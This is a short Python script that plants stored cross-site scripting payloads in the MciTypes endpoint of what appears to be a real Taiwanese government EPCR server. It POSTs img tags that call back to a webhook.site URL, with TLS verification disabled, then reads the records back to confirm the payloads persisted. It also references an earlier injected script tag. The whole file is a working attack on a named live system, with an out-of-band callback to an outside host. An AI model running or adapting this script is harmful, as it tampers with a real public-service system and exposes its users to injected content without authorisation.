#!/usr/bin/env python3
"""
Plant Stored XSS in 4008 MciTypes with webhook.site OOB payload.
Original entry: id=1003 with <script>alert(1)</script>
Plan: add id=1004+ with img src to webhook.site
"""
import requests, urllib3, json
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

URL = "https://epcr.tpf.gov.tw:4008/MciTypes"
WEBHOOK_UUID = "9938583b-2e29-4de9-8231-ac50b3e44016"

payloads = [
    f'<img src="https://webhook.site/{WEBHOOK_UUID}/4008_id1004?case=4008_mci_xss">',
    f'<img src="https://webhook.site/{WEBHOOK_UUID}/4008_id1005?case=4008_mci_xss">',
]

for i, p in enumerate(payloads, 1004):
    r = requests.post(URL, json={"name": p}, verify=False, timeout=10)
    print(f"  [{i}] POST /MciTypes status={r.status_code} len={len(r.text)} loc={r.headers.get('Location')}")
    if r.status_code == 201:
        try:
            data = r.json()
            print(f"      new id={data.get('id')} name={data.get('name')[:80]}")
        except Exception as e:
            print(f"      parse err {e}, body[:200]={r.text[:200]}")
    else:
        print(f"      body[:200]={r.text[:200]}")

# Verify
print("\n===== Verify =====")
r = requests.get(URL, verify=False, timeout=10)
print(f"GET /MciTypes: status={r.status_code} len={len(r.text)}")
try:
    arr = r.json()
    for x in arr:
        if isinstance(x, dict) and 'name' in x and ('webhook' in str(x.get('name','')) or '<script>' in str(x.get('name','')) or '<img' in str(x.get('name',''))):
            print(f"  id={x.get('id')} name={x.get('name')[:120]}")
except Exception as e:
    print(f"  ERR parse: {e}")